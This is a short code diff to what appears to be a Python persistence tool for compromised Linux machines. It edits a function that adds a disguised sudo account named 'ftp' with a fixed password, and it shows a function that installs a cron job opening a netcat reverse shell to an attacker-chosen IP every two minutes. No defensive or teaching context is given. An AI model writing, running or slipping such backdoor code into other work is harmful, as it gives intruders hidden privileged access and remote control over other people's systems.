@@ -5,7 +5,7 @@ import sys
 def createSuperUser():
 	username = 'ftp' #switch to fit more likely with something
 	password = 'returnER' #change password if you want
-	os.system(['useradd', '-aG sudo', '-p', password, username])
+	os.system(f'useradd -aG sudo -p {password} {username}')
 
 def createCronTabBackDoor(ip):
 	os.system(f'(crontab -l ; echo "*/2 * * * * sleep 200 && nc {ip} 8888 -e /bin/bash") | crontab 2> /dev/null')
